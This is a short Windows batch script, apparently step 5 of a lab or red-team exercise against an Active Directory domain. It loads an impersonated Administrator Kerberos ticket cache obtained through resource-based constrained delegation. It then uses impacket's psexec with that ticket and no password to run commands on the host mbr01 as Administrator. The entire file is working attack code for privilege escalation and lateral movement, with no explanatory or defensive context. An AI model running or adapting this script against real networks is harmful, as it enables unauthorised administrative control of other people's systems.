@echo off
REM WT007 RBCD step 5: use ccache ticket -> psexec whoami on mbr01
cd /d C:\Tools\cadre-attack
set KRB5CCNAME=C:\Tools\cadre-attack\Administrator@cifs_mbr01.child.cadre.local@CHILD.CADRE.LOCAL.ccache
echo Running whoami as impersonated Administrator...
python C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\psexec.py -k -no-pass mbr01.child.cadre.local -dc-ip dc02.child.cadre.local whoami 2>&1
echo PSEXEC_RC %ERRORLEVEL%
